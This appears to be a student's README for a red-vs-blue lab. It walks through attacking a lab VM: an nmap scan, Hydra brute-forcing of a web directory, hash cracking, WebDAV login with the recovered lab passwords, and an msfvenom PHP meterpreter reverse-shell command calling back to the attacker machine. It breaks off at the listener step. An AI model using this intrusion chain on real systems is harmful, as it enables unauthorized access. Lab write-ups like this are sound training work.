# RED-vs-BLUE
Project demostrating my knowledge in defensive security, and pentration testing in a gray box environment.
## Network Topology
![Topology](Images/red-team-env)

| Name | Function | IP Address |
| -------- | --------| --------- |
| Kali VM  | Attacking Machine | 192.168.1.90 |
| Capstone VM | Target Machine | 192.168.1.105 |
| ELK Server | Monitoring Machine | 192.168.1.100 |

## Discover the IP address for the Linux server

-Open up a terminal and run an nmap of the network
`nmap 192.168.1.0/24`
![Nmap scan]{Images/nmap_find_webserver.png}

- Looking at the image above we can see that port 80 is open on 192.168.1.105. Which is the machine that we are looking for.

- We now need to open up a browser and navigate to the web page.
` http://192.168.1.105 `

## Locate the hidden directory on the server

- Navigating through different directories, you will see a reoccurring message.
*Please refer to company_folder/secret_folder for more information*
*ERROR: company_folders/secret_folder/ is no longer accessible to the public*

- Navigate to that directory by updating the path in the url.
` http://192.168.1.105/company_folders_secret_folder `

- The directory asks for authentication in order to access it. Reading the authentication method, it says *For ashton's eyes only*

- This gives us a good idea on what account to target

## Brute force the password for the hidden directory

- Because the folder is password protected, we need to either guess the password or brute force into the directory. In, this case, it would be much more efficient to use a brute force attack, specifically Hydra.

- Command used `hydra -l ashton -P ./wordlist/rockyou.txt -s 80 -f 192.168.1.105 http-get /company_folders/secret_folder`
![Hydra](Images/hydra_psswd_hash.png)

- We can see that Ashton's password is *leopoldo*
- Going back to the *company_folders/secret_folder* enter the information that we found.

- Once inside the directory navigate the the *connect_to_corp_server* We find instructions on how to connect to the server via **WebDAV**
- We can also see ryan's password hash.
![webdav instructions](Imaages/web-dav-dir.png)

## Connect to the server via WebDAV

- Using ryan's password hash we can either put the hash into a file with the proper format and use `john`, or we can use *https://crackstation.net* to crack the passwod. In this case we will be using *crackstation*.

-Naviage to *https://crackstation.net* and enter the hash into the text box.

![Crackstation](Images/crackstation_psswd_hash.png)

- The password is revealed as: `linux4u`

## Connect to the server via WebDAV

- In order to connect to the webserver via WebDAV we need to do as follows.
  1. Open the **File System** from the desktop
  2. Click **Browse Network**
  3. In the URL bar, type: `dav://192.168.1.105/webdav` and enter ryans credentials to log in.
![Webdav-login](Images/webdav_login.png)

## Upload a PHP reverse shell payload

- We start by creating the payload using **msfvenom**.

- `msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 > shell.php`

![msf-payload](Images/msf-payload.png)

- On the Kali machine we need to set up a listener.
  
